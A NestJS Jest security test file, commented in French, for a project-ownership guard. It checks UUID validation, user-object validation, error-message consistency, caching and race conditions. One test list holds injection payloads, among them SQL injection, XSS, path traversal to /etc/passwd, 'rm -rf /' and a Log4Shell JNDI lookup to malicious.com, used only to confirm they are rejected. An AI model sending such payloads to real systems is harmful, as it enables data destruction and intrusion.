// test/unit/common/guards/project-owner.guard.security.spec.ts

import { Test, TestingModule } from '@nestjs/testing';
import { ExecutionContext, Logger } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { createMock } from '@golevelup/ts-jest';

import { ProjectOwnerGuard } from '../../../../src/common/guards/project-owner.guard';
import { DatabaseService } from '../../../../src/database/database.service';
import { CacheService } from '../../../../src/cache/cache.service';
import {
  ProjectNotFoundException,
  UnauthorizedAccessException,
  InvalidOperationException,
} from '../../../../src/common/exceptions';
import { User } from '../../../../src/common/interfaces/user.interface';
import { ProjectStatus } from '../../../../src/common/enums/project-status.enum';

describe('ProjectOwnerGuard - Security & Edge Cases', () => {
  let guard: ProjectOwnerGuard;
  let databaseService: jest.Mocked<DatabaseService>;
  let cacheService: jest.Mocked<CacheService>;
  let reflector: jest.Mocked<Reflector>;

  const mockUser: User = {
    id: '12345678-1234-4234-8234-123456789014',
    email: 'test@example.com',
    roles: ['user'],
  };

  // VARIABLE MANQUANTE AJOUTÉE
  const invalidUsers = [
    null,
    undefined,
    {},
    { id: 'user-123' }, // Manque email et roles
    { email: 'test@example.com' }, // Manque id et roles
    { roles: ['user'] }, // Manque id et email
    { id: '', email: 'test@example.com', roles: ['user'] }, // ID vide
    { id: 'user-123', email: '', roles: ['user'] }, // Email vide
    // RETIRÉ: { id: 'user-123', email: 'test@example.com', roles: [] }, // roles: [] est VALIDE selon isValidUser
    { id: 'user-123', email: 'test@example.com', roles: null }, // Roles null
    { id: 'user-123', email: 'test@example.com', roles: 'user' }, // Roles pas un array
    { id: 123, email: 'test@example.com', roles: ['user'] }, // ID pas une string
    { id: 'user-123', email: 123, roles: ['user'] }, // Email pas une string
    'invalid-user-string', // String au lieu d'objet
    123, // Number au lieu d'objet
    [], // Array au lieu d'objet
  ];

  const createMockExecutionContext = (
    params: any = {},
    user: any = mockUser,
  ) => {
    return createMock<ExecutionContext>({
      getType: () => 'http',
      switchToHttp: () => ({
        getRequest: () => ({
          params: { id: '30000000-0000-4000-8000-000000000001', ...params },
          user,
        }),
      }),
      getHandler: () => ({}),
    });
  };

  beforeEach(async () => {
    const module: TestingModule = await Test.createTestingModule({
      providers: [
        ProjectOwnerGuard,
        {
          provide: DatabaseService,
          useValue: createMock<DatabaseService>({
            executeWithRetry: jest.fn(),
            project: {
              findFirst: jest.fn(),
            },
          }),
        },
        {
          provide: CacheService,
          useValue: createMock<CacheService>({
            get: jest.fn(),
            set: jest.fn(),
          }),
        },
        {
          provide: Reflector,
          useValue: createMock<Reflector>({
            get: jest.fn().mockReturnValue({}),
          }),
        },
      ],
    }).compile();

    guard = module.get<ProjectOwnerGuard>(ProjectOwnerGuard);
    databaseService = module.get(DatabaseService);
    cacheService = module.get(CacheService);
    reflector = module.get(Reflector);

    jest.clearAllMocks();
  });

  describe('🔐 Tests de Sécurité', () => {
    describe('D1. Protection contre énumération de projets', () => {
      it('should return same error message for non-existent and unauthorized access', async () => {
        // Test projet inexistant
        const nonExistentContext = createMockExecutionContext({
          id: '00000000-0000-4000-8000-000000000000',
        });
        const mockExecuteWithRetry1 =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry1
          .mockImplementationOnce((callback) => callback())
          .mockImplementationOnce((callback) => callback());

        databaseService.project.findFirst = jest
          .fn()
          .mockResolvedValueOnce(null)
          .mockResolvedValueOnce(null);
        cacheService.get.mockResolvedValue(null);

        let nonExistentError: Error | undefined;
        try {
          await guard.canActivate(nonExistentContext);
        } catch (error) {
          nonExistentError = error as Error;
        }

        jest.clearAllMocks();

        // Test projet d'un autre utilisateur
        const unauthorizedContext = createMockExecutionContext({
          id: '11111111-1111-4111-8111-111111111111',
        });
        const mockExecuteWithRetry2 =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry2
          .mockImplementationOnce((callback) => callback())
          .mockImplementationOnce((callback) => callback());

        databaseService.project.findFirst = jest
          .fn()
          .mockResolvedValueOnce(null) // Pas trouvé pour cet utilisateur
          .mockResolvedValueOnce({
            id: '11111111-1111-4111-8111-111111111111',
          }); // Mais existe
        cacheService.get.mockResolvedValue(null);

        let unauthorizedError: Error | undefined;
        try {
          await guard.canActivate(unauthorizedContext);
        } catch (error) {
          unauthorizedError = error as Error;
        }

        // Assert - Les erreurs doivent être différentes mais pas révéler d'informations
        expect(nonExistentError).toBeInstanceOf(ProjectNotFoundException);
        expect(unauthorizedError).toBeInstanceOf(UnauthorizedAccessException);

        // Les messages ne doivent pas révéler si le projet existe ou non
        expect(nonExistentError?.message).toContain('not found');
        expect(unauthorizedError?.message).toContain('permission');
        expect(unauthorizedError?.message).not.toContain('exists');
        expect(unauthorizedError?.message).not.toContain('belongs');
      });
    });

    describe('D2. Protection contre brute force', () => {
      it('should cache negative results to prevent repeated database queries', async () => {
        // Arrange - UUID VALIDE mais utilisateur mal configuré
        const context = createMockExecutionContext({
          id: '22222222-2222-4222-8222-222222222222',
        });

        // Même logique que les tests précédents
        databaseService.executeWithRetry = jest
          .fn()
          .mockImplementation(async (callback) => await callback());

        databaseService.project.findFirst = jest
          .fn()
          .mockResolvedValueOnce(null) // Premier appel: pas trouvé
          .mockResolvedValueOnce({
            id: '22222222-2222-4222-8222-222222222222',
          }); // Deuxième: existe

        cacheService.get.mockResolvedValue(null);
        cacheService.set.mockResolvedValue();

        // Act - Première tentative
        try {
          await guard.canActivate(context);
        } catch (error) {
          // Expected
        }

        // Assert
        expect(cacheService.set).toHaveBeenCalledWith(
          'project_owner:22222222-2222-4222-8222-222222222222:12345678-1234-4234-8234-123456789014',
          expect.objectContaining({
            isOwner: false,
            timestamp: expect.any(Number),
          }),
          60,
        );
      });
    });

    describe('D3. Protection contre injection', () => {
      const maliciousInputs = [
        "'; DROP TABLE projects; --",
        "'; DELETE FROM projects WHERE '1'='1",
        "<script>alert('xss')</script>",
        '../../etc/passwd',
        'null; rm -rf /',
        '${jndi:ldap://malicious.com/evil}',
        "' UNION SELECT * FROM users --",
        '"; cat /etc/passwd; echo "',
      ];

      test.each(maliciousInputs)(
        'should reject malicious input: %s',
        async (maliciousInput) => {
          // Arrange
          const context = createMockExecutionContext({ id: maliciousInput });

          // Act & Assert
          await expect(guard.canActivate(context)).rejects.toThrow(
            InvalidOperationException,
          );
          expect(databaseService.project.findFirst).not.toHaveBeenCalled();
        },
      );
    });

    describe('D4. Validation stricte des objets utilisateur', () => {
      test.each(invalidUsers)(
        'should reject invalid user object: %j',
        async (invalidUser) => {
          // Arrange - Utiliser createMock directement avec user invalide
          const context = createMock<ExecutionContext>({
            getType: () => 'http',
            switchToHttp: () => ({
              getRequest: () => ({
                params: { id: '30000000-0000-4000-8000-000000000001' }, // UUID VALIDE
                user: invalidUser, // Utilisateur INVALIDE
              }),
            }),
            getHandler: () => ({}),
          });

          // Act & Assert
          await expect(guard.canActivate(context)).rejects.toThrow(
            InvalidOperationException,
          );
          expect(databaseService.project.findFirst).not.toHaveBeenCalled();
        },
      );
    });

    describe('D5. Validation UUID exhaustive', () => {
      describe('Valid UUIDs', () => {
        const validUUIDs = [
          '123e4567-e89b-12d3-a456-426614174000', // v1
          '123e4567-e89b-22d3-a456-426614174000', // v2
          '123e4567-e89b-32d3-a456-426614174000', // v3
          '123e4567-e89b-42d3-a456-426614174000', // v4
          '123e4567-e89b-52d3-a456-426614174000', // v5
          'a1b2c3d4-e5f6-47a8-89b0-c1d2e3f4a5b6',
          '00000000-0000-4000-8000-000000000000', // UUID zéro valide
          'ffffffff-ffff-4fff-afff-ffffffffffff', // UUID max valide
        ];

        test.each(validUUIDs)(
          'should accept valid UUID: %s',
          async (validUUID) => {
            // Arrange
            const context = createMockExecutionContext({ id: validUUID });
            const mockExecuteWithRetry =
              databaseService.executeWithRetry as jest.Mock;
            mockExecuteWithRetry.mockImplementation((callback) => callback());

            databaseService.project.findFirst = jest.fn().mockResolvedValue({
              id: validUUID,
              ownerId: '12345678-1234-4234-8234-123456789014',
              status: ProjectStatus.ACTIVE,
            });
            cacheService.get.mockResolvedValue(null);

            // Act
            const result = await guard.canActivate(context);

            // Assert
            expect(result).toBe(true);
            expect(databaseService.project.findFirst).toHaveBeenCalledWith(
              expect.objectContaining({
                where: expect.objectContaining({
                  id: validUUID,
                }),
              }),
            );
          },
        );
      });

      describe('Invalid UUIDs', () => {
        const invalidUUIDs = [
          '123e4567e89b12d3a456426614174000', // Sans tirets
          '123e4567-e89b-12d3-a456-42661417400', // Trop court
          '123e4567-e89b-12d3-a456-4266141740000', // Trop long
          '123e4567-e89b-62d3-a456-426614174000', // Version 6 (non standard)
          '123e4567-e89b-72d3-a456-426614174000', // Version 7 (non standard)
          'gggggggg-gggg-gggg-gggg-gggggggggggg', // Caractères invalides
          '123e4567-e89b-12d3-g456-426614174000', // Caractère invalide dans variant
          '123e4567-e89b--2d3-a456-426614174000', // Double tiret
          '-23e4567-e89b-12d3-a456-426614174000', // Commence par tiret
          '123e4567-e89b-12d3-a456-426614174000-', // Finit par tiret
          '123e4567_e89b_12d3_a456_426614174000', // Underscores au lieu de tirets
          '{123e4567-e89b-12d3-a456-426614174000}', // Avec accolades
          'uuid:123e4567-e89b-12d3-a456-426614174000', // Avec préfixe
        ];

        test.each(invalidUUIDs)(
          'should reject invalid UUID: %s',
          async (invalidUUID) => {
            // Arrange
            const context = createMockExecutionContext({ id: invalidUUID });

            // Act & Assert
            await expect(guard.canActivate(context)).rejects.toThrow(
              InvalidOperationException,
            );
            await expect(guard.canActivate(context)).rejects.toThrow(
              'Project ID must be a valid UUID',
            );
            expect(databaseService.project.findFirst).not.toHaveBeenCalled();
          },
        );
      });
    });
  });

  describe('🧩 Edge Cases Complexes', () => {
    describe('I1. Gestion des utilisateurs supprimés', () => {
      it('should handle case where user token is valid but user is deleted', async () => {
        // Arrange - Token valide mais utilisateur "fantôme"
        const ghostUser: User = {
          id: '11111111-1111-4111-8111-111111111111', // UUID VALIDE
          email: 'deleted@example.com',
          roles: ['user'],
        };
        const context = createMockExecutionContext({}, ghostUser);
        const mockExecuteWithRetry =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry
          .mockImplementationOnce((callback) => callback())
          .mockImplementationOnce((callback) => callback());

        // Projet n'existe pas pour cet utilisateur (car utilisateur supprimé)
        databaseService.project.findFirst = jest
          .fn()
          .mockResolvedValueOnce(null)
          .mockResolvedValueOnce(null);
        cacheService.get.mockResolvedValue(null);

        // Act & Assert
        await expect(guard.canActivate(context)).rejects.toThrow(
          ProjectNotFoundException,
        );
      });
    });

    describe('I2. Race conditions avec le cache', () => {
      it('should handle cache expiration during verification', async () => {
        // Arrange
        const context = createMockExecutionContext();

        // Simuler cache qui expire pendant la vérification
        let cacheCallCount = 0;
        cacheService.get.mockImplementation(() => {
          cacheCallCount++;
          if (cacheCallCount === 1) {
            // Premier appel - cache valide
            return Promise.resolve({
              isOwner: true,
              projectStatus: ProjectStatus.ACTIVE,
              timestamp: Date.now() - 350000, // Expiré entre get et utilisation
            });
          }
          return Promise.resolve(null);
        });

        const mockExecuteWithRetry =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry.mockImplementation((callback) => callback());
        databaseService.project.findFirst = jest.fn().mockResolvedValue({
          id: '30000000-0000-4000-8000-000000000001',
          ownerId: '12345678-1234-4234-8234-123456789014',
          status: ProjectStatus.ACTIVE,
        });

        // Act
        const result = await guard.canActivate(context);

        // Assert
        expect(result).toBe(true);
        expect(databaseService.project.findFirst).toHaveBeenCalled(); // Fallback vers DB
      });
    });

    describe('I3. Concurrent modifications', () => {
      it('should handle project ownership change during verification', async () => {
        // Arrange
        const context = createMockExecutionContext();
        cacheService.get.mockResolvedValue(null);

        // Simuler changement de propriétaire pendant la vérification
        const mockExecuteWithRetry =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry.mockImplementation((callback) => callback());

        let dbCallCount = 0;
        databaseService.project.findFirst = jest.fn().mockImplementation(() => {
          dbCallCount++;
          if (dbCallCount === 1) {
            // Premier appel - appartient à l'utilisateur
            return Promise.resolve({
              id: '30000000-0000-4000-8000-000000000001',
              ownerId: '12345678-1234-4234-8234-123456789014',
              status: ProjectStatus.ACTIVE,
            });
          }
          // Appels suivants - plus propriétaire (transféré)
          return Promise.resolve(null);
        });

        // Act
        const result = await guard.canActivate(context);

        // Assert - Doit utiliser le résultat du premier appel (cohérence)
        expect(result).toBe(true);
      });
    });

    describe('I4. Gestion mémoire et fuites', () => {
      it('should not leak memory with many concurrent requests', async () => {
        const contexts = Array.from({ length: 100 }, (_, i) =>
          createMockExecutionContext({
            id: `${(30000000 + i).toString().padStart(8, '0')}-0000-4000-8000-000000000001`,
          }),
        );

        const mockExecuteWithRetry =
          databaseService.executeWithRetry as jest.Mock;
        mockExecuteWithRetry.mockImplementation((callback) => callback());

        databaseService.project.findFirst = jest
          .fn()
          .mockImplementation((query) => ({
            id: query.where.id,
            ownerId: '12345678-1234-4234-8234-123456789014',
            status: ProjectStatus.ACTIVE,
          }));

        cacheService.get.mockResolvedValue(null);
        cacheService.set.mockResolvedValue();

        // Act - Traiter tous les contextes en parallèle
        const results = await Promise.all(
          contexts.map((context) => guard.canActivate(context)),
        );

        // Assert
        expect(results).toHaveLength(100);
        expect(results.every((result) => result === true)).toBe(true);

        // Vérifier que le cache a été utilisé correctement
        expect(cacheService.set).toHaveBeenCalledTimes(100);
      });
    });

    describe('I5. Caractères spéciaux et encoding', () => {
      const specialCharacterTests = [
        {
          name: 'Unicode characters in user email',
          user: {
            id: '12345678-1234-4234-8234-123456789014',
            email: 'tëst@examplë.com',
            roles: ['user'],
          },
          shouldPass: true,
        },
        {
          name: 'Emoji in user email',
          user: {
            id: '12345678-1234-4234-8234-123456789014',
            email: 'test🚀@example.com',
            roles: ['user'],
          },
          shouldPass: true,
        },
        {
          name: 'Very long user email',
          user: {
            id: '12345678-1234-4234-8234-123456789014',
            email:
              'very.very.very.long.email.address.that.might.cause.issues@example.com',
            roles: ['user'],
          },
          shouldPass: true,
        },
        {
          name: 'Special characters in roles',
          user: {
            id: '12345678-1234-4234-8234-123456789014',
            email: 'test@example.com',
            roles: ['user-admin', 'special:role', 'role.with.dots'],
          },
          shouldPass: true,
        },
      ];

      test.each(specialCharacterTests)(
        'should handle $name',
        async ({ user, shouldPass }) => {
          // Arrange
          const context = createMockExecutionContext({}, user);
          const mockExecuteWithRetry =
            databaseService.executeWithRetry as jest.Mock;
          mockExecuteWithRetry.mockImplementation((callback) => callback());

          databaseService.project.findFirst = jest.fn().mockResolvedValue({
            id: '30000000-0000-4000-8000-000000000001',
            ownerId: user.id,
            status: ProjectStatus.ACTIVE,
          });
          cacheService.get.mockResolvedValue(null);

          if (shouldPass) {
            // Act
            const result = await guard.canActivate(context);

            // Assert
            expect(result).toBe(true);
          } else {
            // Act & Assert
            await expect(guard.canActivate(context)).rejects.toThrow();
          }
        },
      );
    });
  });

  describe('🔄 Tests de Régression', () => {
    describe('J1. Validation des formats UUID edge cases', () => {
      it('should handle UUID case sensitivity correctly', async () => {
        const uuids = [
          '123e4567-e89b-42d3-a456-426614174000', // Minuscules
          '123E4567-E89B-42D3-A456-426614174000', // Majuscules
          '123e4567-E89B-42d3-A456-426614174000', // Mixte
        ];

        for (const uuid of uuids) {
          // Arrange
          const context = createMockExecutionContext({ id: uuid });
          const mockExecuteWithRetry =
            databaseService.executeWithRetry as jest.Mock;
          mockExecuteWithRetry.mockImplementation((callback) => callback());

          databaseService.project.findFirst = jest.fn().mockResolvedValue({
            id: uuid,
            ownerId: '12345678-1234-4234-8234-123456789014',
            status: ProjectStatus.ACTIVE,
          });
          cacheService.get.mockResolvedValue(null);

          // Act
          const result = await guard.canActivate(context);

          // Assert
          expect(result).toBe(true);

          jest.clearAllMocks();
        }
      });
    });

    describe("J2. Cohérence des messages d'erreur", () => {
      it('should maintain consistent error message format', async () => {
        const testCases = [
          {
            scenario: 'Missing ID',
            createContext: () =>
              createMock<ExecutionContext>({
                getType: () => 'http',
                switchToHttp: () => ({
                  getRequest: () => ({
                    params: {}, // Pas d'ID du tout
                    user: mockUser, // Utilisateur VALIDE
                  }),
                }),
                getHandler: () => ({}),
              }),
            expectedError: InvalidOperationException,
            expectedMessage: 'Project ID is required',
          },
          {
            scenario: 'Invalid UUID',
            createContext: () =>
              createMock<ExecutionContext>({
                getType: () => 'http',
                switchToHttp: () => ({
                  getRequest: () => ({
                    params: { id: 'invalid' },
                    user: mockUser, // Utilisateur VALIDE
                  }),
                }),
                getHandler: () => ({}),
              }),
            expectedError: InvalidOperationException,
            expectedMessage: 'Project ID must be a valid UUID',
          },
          {
            scenario: 'Non-string ID',
            createContext: () =>
              createMock<ExecutionContext>({
                getType: () => 'http',
                switchToHttp: () => ({
                  getRequest: () => ({
                    params: { id: 123 },
                    user: mockUser, // Utilisateur VALIDE
                  }),
                }),
                getHandler: () => ({}),
              }),
            expectedError: InvalidOperationException,
            expectedMessage: 'Project ID must be a string',
          },
        ];

        for (const {
          scenario,
          createContext,
          expectedError,
          expectedMessage,
        } of testCases) {
          // Arrange
          const context = createContext();

          // Act & Assert
          await expect(guard.canActivate(context)).rejects.toThrow(
            expectedError,
          );
          await expect(guard.canActivate(context)).rejects.toThrow(
            expectedMessage,
          );
        }
      });
    });

    describe('J3. Comportement avec différents status de projet', () => {
      it('should handle all project statuses consistently', async () => {
        const statusTests = [
          {
            status: ProjectStatus.ACTIVE,
            allowArchived: false,
            shouldPass: true,
          },
          {
            status: ProjectStatus.ARCHIVED,
            allowArchived: false,
            shouldPass: false,
          },
          {
            status: ProjectStatus.ARCHIVED,
            allowArchived: true,
            shouldPass: true,
          },
          {
            status: ProjectStatus.DELETED,
            allowArchived: false,
            shouldPass: false,
          },
          {
            status: ProjectStatus.DELETED,
            allowArchived: true,
            shouldPass: false,
          }, // DELETED jamais autorisé
        ];

        for (const { status, allowArchived, shouldPass } of statusTests) {
          // Arrange - CORRECTION : Utiliser des UUIDs valides
          const projectId = `70000000-0000-4000-${
            status === ProjectStatus.ACTIVE
              ? '8001'
              : status === ProjectStatus.ARCHIVED
                ? '8002'
                : '8003'
          }-000000000001`;

          const context = createMockExecutionContext({ id: projectId });
          reflector.get.mockReturnValue({ allowArchived });

          const mockExecuteWithRetry =
            databaseService.executeWithRetry as jest.Mock;
          mockExecuteWithRetry.mockImplementation((callback) => callback());

          if (shouldPass) {
            databaseService.project.findFirst = jest.fn().mockResolvedValue({
              id: projectId,
              ownerId: '12345678-1234-4234-8234-123456789014',
              status,
            });
          } else {
            // Simuler le comportement du guard : premier appel fail, deuxième selon le status
            databaseService.project.findFirst = jest
              .fn()
              .mockResolvedValueOnce(null) // Pas trouvé avec les critères
              .mockResolvedValueOnce(
                status === ProjectStatus.DELETED ? null : { id: projectId },
              );
          }

          cacheService.get.mockResolvedValue(null);

          if (shouldPass) {
            // Act
            const result = await guard.canActivate(context);
            // Assert
            expect(result).toBe(true);
          } else {
            // Act & Assert
            await expect(guard.canActivate(context)).rejects.toThrow();
          }

          jest.clearAllMocks();
        }
      });
    });
  });
});
